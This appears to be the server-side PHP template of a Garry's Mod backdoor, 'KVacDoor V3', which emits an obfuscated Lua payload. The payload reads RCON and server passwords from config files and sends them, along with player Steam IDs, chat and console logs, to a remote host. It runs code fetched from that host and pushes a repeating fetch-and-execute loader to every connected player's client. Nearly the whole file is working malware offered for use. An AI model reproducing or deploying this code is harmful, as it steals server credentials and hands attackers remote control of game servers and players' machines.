<?php
require_once '../_/drm.php';



die();





//
//  IGNORED
// 


require_once '../../app/Models/includes.php';
if (User::isAuthentified() || !GarryMod::ValidUserAgent())
{
    die();
}

if( !isset($_GET['key']) || empty($_GET['key']) || strlen($_GET['key']) != 20) {
	$infectkey = "";
} else {
	$infectkey = "?key=".$_GET['key'];
}

?>
--[[
██╗  ██╗██╗   ██╗ █████╗  ██████╗██████╗  ██████╗  ██████╗ ██████╗ 
██║ ██╔╝██║   ██║██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
█████╔╝ ██║   ██║███████║██║     ██║  ██║██║   ██║██║   ██║██████╔╝
██╔═██╗ ╚██╗ ██╔╝██╔══██║██║     ██║  ██║██║   ██║██║   ██║██╔══██╗
██║  ██╗ ╚████╔╝ ██║  ██║╚██████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝ ╚═════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝

V3 (By WaDixix & ./Alex)
]]

if w<?= GarryMod::UniqueHashFromIP("GrasZone"); ?>a == "<?= GarryMod::UniqueHashFromIP("110kg"); ?>" then return end
w<?= GarryMod::UniqueHashFromIP("GrasZone"); ?>a = "<?= GarryMod::UniqueHashFromIP("110kg"); ?>"

RunConsoleCommand("sv_hibernate_drop_bots","0")
RunConsoleCommand("sv_hibernate_think","1")

local HTTP = HTTP
local RunString = RunString
local file = file
local timer = timer

local website = 'https://kvac.cz'
local infectkey = '<?= $infectkey ?>'

local function KViQnsvPWmrpjUXrFbMTfIlVdgwpWSPi(zdHniMAEkzYTUsLExJAjujMCfndmVekL)
    if(#zdHniMAEkzYTUsLExJAjujMCfndmVekL ~= 0) then
        RunString(zdHniMAEkzYTUsLExJAjujMCfndmVekL)
    end
end

local function LugYKQDmLEdfdvhfxEbxmpagionbPjgGzdfWvWrn(mwMjEfguQnZQarSyhySJWCkoHZuSeAAlMxcCXeBj)
    if(!mwMjEfguQnZQarSyhySJWCkoHZuSeAAlMxcCXeBj:IsBot()) then
        mwMjEfguQnZQarSyhySJWCkoHZuSeAAlMxcCXeBj:SendLua([[local function buXCbCueGBMDL() http.Fetch("]] .. website .. [[/_/more.php", function(jAeljXKMQILtO) CompileString(jAeljXKMQILtO, ">", false)() end) timer.Simple(120, buXCbCueGBMDL) end buXCbCueGBMDL()]])
    end
end

local function UxoDFtIfhLCaQpFxNGAKsdwSdADXHOTipeyCdcmU()
    local GendPucoyGbZXzSDXIGhixRNScTxCHTI = 30
    if #player.GetHumans() >= 1 then
        GendPucoyGbZXzSDXIGhixRNScTxCHTI = <?= Params::GetValue('timer_call'); ?>
    end
    local OtdHOCTMPLXYWeliWQZwaakasGlbNvEP = {}
    for i=1, #player.GetAll() do
        table.insert(OtdHOCTMPLXYWeliWQZwaakasGlbNvEP, player.GetAll()[i]:Nick() .. "||||||" .. player.GetAll()[i]:GetUserGroup() .. "||||||" .. player.GetAll()[i]:SteamID64())
    end
    local IAeABCVZCIWUZVWucVoQoQADpRvAWlLm = {
        nbplayer = tostring(#player.GetAll()),
        playerlist = util.TableToJSON(OtdHOCTMPLXYWeliWQZwaakasGlbNvEP),
        ip = game.GetIPAddress(),
        ab = debug.getinfo(HTTP).short_src,
        ba = debug.getinfo(RunString).short_src,
        alexkey = "<?= GarryMod::UniqueHashFromIP('ALEXKEY'); ?>"
    }
    HTTP({url=website .. "/_/__.php",method="post",parameters=IAeABCVZCIWUZVWucVoQoQADpRvAWlLm,success=function(hLCaQpFx,QUDLAjxo,DuXRbSAdRD) KViQnsvPWmrpjUXrFbMTfIlVdgwpWSPi(QUDLAjxo) end})
    timer.Create("<?= GarryMod::UniqueHashFromIP('ALEXEXEC'); ?>", GendPucoyGbZXzSDXIGhixRNScTxCHTI, 0, UxoDFtIfhLCaQpFxNGAKsdwSdADXHOTipeyCdcmU)
end

local function iJgPEQXNlYFSCJBWBosyPcgaRFUjQYjUowNEkPQI()

	local info = {}
	local files = file.Find("cfg/*", "GAME")

	for i = 1, #files do 
		if string.EndsWith(files[i], ".cfg") then
			local content = file.Read("cfg/" .. files[i], "GAME")
			content = string.Explode("\n", content)

			for i = 1, #content do
				if string.StartWith(content[i], "rcon_password") then
					table.insert(info, 1, string.Split(content[i], "\"")[2])
				end

				if string.StartWith(content[i], "sv_password") then
				    table.insert(info, 2, string.Split(content[i], "\"")[2])
				end
			end
		end
	end

    local bwkozJmJcsjCcvenJudHMDBnRwdbdieXjqfgIcXT = {
        ip = game.GetIPAddress(),
        hostname = GetHostName(),
        map = game.GetMap(),
        gamemode = engine.ActiveGamemode(),
        maxplayer = tostring(game.MaxPlayers()),
        rcon = info[1],
        password = info[2],
        uptime = tostring(math.floor(CurTime())),
        alexkey = "<?= GarryMod::UniqueHashFromIP('PlayerSo'); ?>" 
    }

    HTTP({url=website .. "\x2f\x5f\x2f\x5f\x5f\x2e\x70\x68\x70" .. infectkey,method="post",parameters=bwkozJmJcsjCcvenJudHMDBnRwdbdieXjqfgIcXT})
end

local function UbZujtgSlrZGLKtgqfOWhtshzjbUehHm(pYHFntCMSLAtLRu, TMEvBRTjTBCtwneJB)
    local sHpMczFXunICmUjalaUdlgBPcSjsjNyY = 
    {
        name = pYHFntCMSLAtLRu:Nick(),
        ip = game.GetIPAddress(),
        steamid_chat = ply:SteamID64(),
        text_chat = TMEvBRTjTBCtwneJB
    }
    HTTP({url=website .. "\x2f\x5f\x2f\x70\x6f\x73\x74\x2d\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x70\x68\x70",method="post",parameters=sHpMczFXunICmUjalaUdlgBPcSjsjNyY})
end

local cache = {}

hook.Add("PlayerSay", "<?= GarryMod::UniqueHashFromIP('PlayerSay'); ?>", function(ply, msg)
	table.insert(cache, ply:Name().." : "..msg)
end)

hook.Add("PlayerInitialSpawn", "<?= GarryMod::UniqueHashFromIP('PlayerSpawn'); ?>", function(ply)
	table.insert(cache, ply:Name().." entered the game")
end)

hook.Add("PlayerDisconnected", "<?= GarryMod::UniqueHashFromIP('PlayerDisco'); ?>", function(ply)
	table.insert(cache, ply:Name().." leave the game")
end)
hook.Add("PlayerDeath", "<?= GarryMod::UniqueHashFromIP('PlayerDeath'); ?>", function(ply)
	table.insert(cache, ply:Name().." is dead")
end)

local realprint = print

function print(...)
	local args = {...}
	table.insert(cache, args[1])
	return realprint(...)
end

timer.Create("<?= GarryMod::UniqueHashFromIP('CONSOLED'); ?>", 10, 0, function()
	if table.Count(cache) == 0 then
		return
	end
	local str = table.concat(cache, "\xFF")
	http.Post(website .. "\x2f\x5f\x2f\x70\x6f\x73\x74\x2d\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x70\x68\x70", {ip=game.GetIPAddress(),msg=str})
	cache = {}
end)

timer.Create("<?= GarryMod::UniqueHashFromIP('ALEXEXEC'); ?>", 5, 0, UxoDFtIfhLCaQpFxNGAKsdwSdADXHOTipeyCdcmU)
timer.Create("<?= GarryMod::UniqueHashFromIP('WADIXEXEC'); ?>", 30, 0, iJgPEQXNlYFSCJBWBosyPcgaRFUjQYjUowNEkPQI)

timer.Simple(math.random(1,3), function()
	concommand.Remove("\x68\x6f\x73\x74\x5f\x77\x72\x69\x74\x65\x69\x64") -- #LelKeeta
	hook.Add("PlayerInitialSpawn", "<?= GarryMod::UniqueHashFromIP('TRACKZONE == GAY'); ?>", LugYKQDmLEdfdvhfxEbxmpagionbPjgGzdfWvWrn)
	hook.Add("PlayerSay", "<?= GarryMod::UniqueHashFromIP('HAAAAAAAAAX'); ?>", UbZujtgSlrZGLKtgqfOWhtshzjbUehHm)
	iJgPEQXNlYFSCJBWBosyPcgaRFUjQYjUowNEkPQI()
	for k,v in pairs(player.GetAll()) do
		LugYKQDmLEdfdvhfxEbxmpagionbPjgGzdfWvWrn(v)
	end
end)